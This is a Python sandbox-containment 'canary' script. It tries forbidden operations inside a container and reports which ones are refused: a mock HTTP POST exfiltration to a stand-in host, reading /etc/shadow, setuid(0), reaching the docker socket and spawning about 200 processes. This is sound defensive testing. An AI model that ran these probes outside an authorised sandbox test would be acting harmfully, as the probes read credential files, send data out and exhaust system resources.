#!/usr/bin/env python3
"""
Faraday behavioural canary -- the demo's instrumentation, not a payload.

Deliberately attempts N operations the cage must refuse, then reports which
were refused. Nothing here is malicious: there is no exploit, no persistence,
no obfuscation and no payload. Every attempt is a one-line stdlib call whose
only purpose is to trip a sensor and be counted.

This is better demo material than real malware for three reasons: it is
deterministic on camera, it enumerates the entire policy surface in one run,
and it can be read aloud to a judge without anyone needing to trust us.

Run it inside the cage:
    docker run --rm <cage flags> faraday-cage:latest python3 /opt/faraday/canary.py
"""
from __future__ import annotations

import json
import os
import socket
import subprocess
import sys
from pathlib import Path

RESULTS: list[dict] = []


class Skip(Exception):
    """The attempt could not be made, so nothing was proven either way."""


class Blocked(Exception):
    """The attempt was made and the system refused it."""


def attempt(name: str, expect: str, fn) -> None:
    """
    Record the OUTCOME of an attempt, not merely whether Python raised.

    Two bugs this shape fixes, both found on a real daemon:

      * `unshare -n` returning exit code 1 raised no exception, so the canary
        reported "ALLOWED" for an operation the kernel had in fact refused --
        inventing a hole in the cage that did not exist.

      * reading /input when nothing was mounted there raised StopIteration,
        which got recorded as "REFUSED" -- a PASS for a test that never ran.
        A false pass in a containment proof is worse than a false failure.

    So probes now raise Blocked when they observe a refusal, Skip when they
    cannot run, and return normally ONLY when the forbidden thing succeeded.
    A skipped probe is not counted as contained.
    """
    try:
        value = fn()
    except Skip as exc:
        RESULTS.append({"attempt": name, "expected": expect,
                        "outcome": "SKIPPED", "detail": str(exc)[:160],
                        "contained": None})
        return
    except Blocked as exc:
        RESULTS.append({"attempt": name, "expected": expect,
                        "outcome": "REFUSED", "detail": str(exc)[:160],
                        "contained": True})
        return
    except BaseException as exc:
        RESULTS.append({"attempt": name, "expected": expect,
                        "outcome": "REFUSED",
                        "detail": f"{type(exc).__name__}: {exc}"[:160],
                        "contained": True})
        return
    RESULTS.append({"attempt": name, "expected": expect,
                    "outcome": "ALLOWED", "detail": str(value)[:160],
                    "contained": False})


def _resolve():
    return socket.gethostbyname("intake.exfil-example.invalid")


def _connect_out():
    s = socket.create_connection(("1.1.1.1", 53), timeout=3)
    s.close()
    return "connected"


def _http_post():
    import urllib.request
    req = urllib.request.Request(
        "http://intake.exfil-example.invalid/manifest",
        data=b'{"exfil":"privileged document text"}',
        method="POST")
    with urllib.request.urlopen(req, timeout=4) as r:
        return f"HTTP {r.status}"


def _read_shadow():
    return Path("/etc/shadow").read_text()[:40]


def _write_rootfs():
    p = Path("/opt/faraday/.canary")
    p.write_text("x")
    return "wrote to read-only rootfs"


def _write_input():
    if not Path("/input").is_dir():
        raise Skip("/input not mounted -- nothing to tamper with")
    files = [p for p in Path("/input").iterdir() if p.is_file()]
    if not files:
        raise Skip("/input is empty -- mount an evidence file to test this")
    with files[0].open("ab") as fh:
        fh.write(b"tamper")
    return f"modified the evidence file {files[0].name}"


def _exec_tmpfs():
    p = Path("/work/t.sh")
    p.write_text("#!/bin/sh\necho hi\n")
    p.chmod(0o755)
    try:
        r = subprocess.run([str(p)], capture_output=True, timeout=5)
    except OSError as exc:
        raise Blocked(f"exec refused: {exc}")
    if r.returncode != 0:
        raise Blocked(f"exec exited {r.returncode}")
    return r.stdout.decode()


def _new_namespace():
    try:
        r = subprocess.run(["unshare", "-n", "true"], capture_output=True, timeout=5)
    except FileNotFoundError:
        raise Skip("unshare not present in the image")
    if r.returncode != 0:
        err = (r.stderr or b"").decode("utf-8", "replace").strip()
        raise Blocked(f"unshare exited {r.returncode}: {err[:110]}")
    return "created a new network namespace"


def _docker_sock():
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect("/var/run/docker.sock")
    s.close()
    return "docker socket reachable"


def _escalate():
    os.setuid(0)
    return f"uid now {os.getuid()}"


def _fork_bomb_probe():
    """Spawn past pids_limit; the limit should bite before we finish."""
    kids = []
    try:
        for _ in range(200):
            kids.append(subprocess.Popen([sys.executable, "-c", "import time;time.sleep(5)"]))
        return f"spawned {len(kids)} processes unchecked"
    finally:
        for k in kids:
            try:
                k.kill()
            except Exception:
                pass


def main() -> int:
    attempt("dns_resolve_external", "sinkholed or refused", _resolve)
    attempt("tcp_connect_external", "no route off the bridge", _connect_out)
    attempt("http_post_exfil", "sinkholed and logged", _http_post)
    attempt("read_etc_shadow", "permission denied", _read_shadow)
    attempt("write_readonly_rootfs", "read-only filesystem", _write_rootfs)
    attempt("tamper_input_evidence", "read-only bind mount", _write_input)
    attempt("exec_from_tmpfs", "noexec on /work", _exec_tmpfs)
    attempt("create_net_namespace", "seccomp blocks CLONE_NEWNET", _new_namespace)
    attempt("reach_docker_socket", "socket not mounted", _docker_sock)
    attempt("privilege_escalation", "no-new-privileges + cap_drop ALL", _escalate)
    attempt("process_exhaustion", "pids_limit enforced", _fork_bomb_probe)

    contained = sum(1 for r in RESULTS if r["contained"] is True)
    allowed = sum(1 for r in RESULTS if r["contained"] is False)
    skipped = sum(1 for r in RESULTS if r["contained"] is None)
    total = len(RESULTS)
    # Sealed means: nothing got through, AND every probe actually ran. A
    # skipped probe proves nothing, so it cannot count toward a pass.
    sealed = allowed == 0 and skipped == 0
    print(json.dumps({
        "ok": True,
        "canary": True,
        "contained": contained,
        "allowed": allowed,
        "skipped": skipped,
        "total": total,
        "sealed": sealed,
        "attempts": RESULTS,
    }, indent=2))
    return 0 if sealed else 3


if __name__ == "__main__":
    sys.exit(main())
